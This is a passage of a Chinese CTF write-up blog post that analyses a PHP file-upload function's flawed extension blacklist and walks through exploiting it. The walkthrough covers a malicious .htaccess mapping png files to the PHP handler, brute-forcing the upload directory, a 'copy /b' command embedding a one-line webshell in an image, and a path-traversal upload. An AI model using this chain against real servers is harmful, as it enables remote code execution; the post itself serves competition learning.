class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phtm&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>, <span class="string">&#x27;php8&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;tpl&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;.&quot;</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">strlen</span>(<span class="variable">$text_type</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$text_ext</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$text_type</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$text_ext</span> = <span class="string">&quot;.&quot;</span> . <span class="variable">$text_type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$text_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$text_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$text_ext</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$text_filename</span> = <span class="variable">$text_filename</span> . <span class="variable">$text_ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$text_filename</span>) == <span class="number">0</span> || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>) ||!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9_]/is&#x27;</span>, <span class="variable">$text_filename</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$text_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$text_filename</span>;</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="variable">$text_tmp_file</span>, <span class="variable">$text_file_path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用黑名单过滤文件后缀，代码获取文件后缀的方法取文件名中最后一个<code>.</code>后面的字符串作为后缀，所以后缀是不含<code>.</code>字符的，所以过滤的黑名单中.htaccess是无效的，通过这个漏洞我们可以上传.htaccess文件。</p>
+<p>到此攻击链就产生了，首先上传一个.htaccess文件，由于目录与时间有关，所以进行爆破来获取目录；接着上传图片马，利用目录穿越存储到.htaccess所在的文件夹，配合.htaccess实现解析图片马</p>
+<p><strong>攻击</strong></p>
+<p>首先上传一个恶意的.htaccess，内容如下（要将hw_file_name置空，这样拼接后才能得到.htaccess文件名）</p>
+<p>恶意.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/05/wdb2022/6.png" class="">
+
+<p>然后爆破目录，可以得到文件目录为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/files/20220921055137/</span><br></pre></td></tr></table></figure>
+
+<p>接下来把图片通过路径穿越上传到同一目录即可，首先创建一张普通图片，然后写一个一句话木马exp.php，在cmd执行下列命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b exp.png + exp.php expp.png</span><br></pre></td></tr></table></figure>
+
+<p>文件上传</p>
+<img src="/2022/09/05/wdb2022/7.png" class="">
+
+<p>然后访问该文件即可</p>
+<img src="/2022/09/05/wdb2022/8.png" class="">
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/09/05/wdb2022/">http://example.com/2022/09/05/wdb2022/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/09/18/dasctf202209/">DASCTF 2022-09 月赛题解</a>
+            
+            
+            <a class="next" rel="next" href="/2022/07/04/shiro/">Shiro相关漏洞学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
